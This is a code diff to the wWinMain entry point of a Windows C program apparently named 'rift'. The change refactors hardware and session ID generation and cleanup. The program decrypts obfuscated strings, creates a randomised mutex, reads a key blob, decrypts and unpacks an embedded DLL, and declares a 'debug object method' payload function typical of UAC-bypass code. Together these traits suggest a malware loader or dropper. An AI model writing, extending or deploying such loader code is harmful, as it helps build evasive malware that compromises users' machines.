@@ -1,8 +1,10 @@
-#include "pch.h"
 #include "_rift.h"
 
-typedef BOOL(*pEDllInit)(PPIB);
+typedef BOOL(*pEDllInit)(_In_ PPIB);
 typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
+VOID IGenerateHardwareId(
+	_Out_ PUUID pHwId
+);
 
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
@@ -12,21 +14,22 @@ INT WINAPI wWinMain(
 ) {
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
-	{	// Process Information Block
+	{	// Initialize Process Information Block
 		g_PIB->hMH = hInstance;
 		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
 		EXoshiroBegin(NULL);
-		IGenerateHwid(g_PIB->Hwid);
+		IGenerateHardwareId(&g_PIB->sID.HW);
+		IGenerateSessionId(&g_PIB->sID.SE);
 	}
 
-	// Create Random Mutex using Hwid
+	// Create Random Mutex using SId
 	SIZE_T nResult;
 	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
 	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
 	StringCchCopyW(szMutex, MAX_PATH, szLocal);
 	FreeMemory(szLocal);
 	PVOID pHWID = AllocMemory(MD5_SIZE);
-	CopyMemory(pHWID, g_PIB->Hwid, MD5_SIZE);
+	CopyMemory(pHWID, &g_PIB->sID.SE, MD5_SIZE);
 	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH);
 	FreeMemory(pHWID);
 	StringCchCatW(szMutex, MAX_PATH, szRandom);
@@ -45,12 +48,12 @@ INT WINAPI wWinMain(
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
 	} if (pWKey)
-		ECryptBegin(pWKey, &g_PIB->cibWK);
+		ECryptBegin(pWKey, &g_PIB->sCIB.WK);
 	else
 		return 0x45e0;
 
 	SIZE_T nDll;
-	PVOID pDll = EUnpackResource(&g_PIB->cibWK, IDR_RIFTDLL, &nDll);
+	PVOID pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
 	if (!pDll)
 		return 0x132d;
 
@@ -83,10 +86,7 @@ INT WINAPI wWinMain(
 
 	{	// CleanUp
 		EXoshiroEnd(NULL);
-		CloseHandle(g_PIB->hPH);
-		HANDLE hPH = GetProcessHeap();
-		HeapFree(hPH, NULL, g_PIB);
-		CloseHandle(hPH);
+		HeapFree(g_PIB->hPH, NULL, g_PIB);
 	} return 0;
 }
 
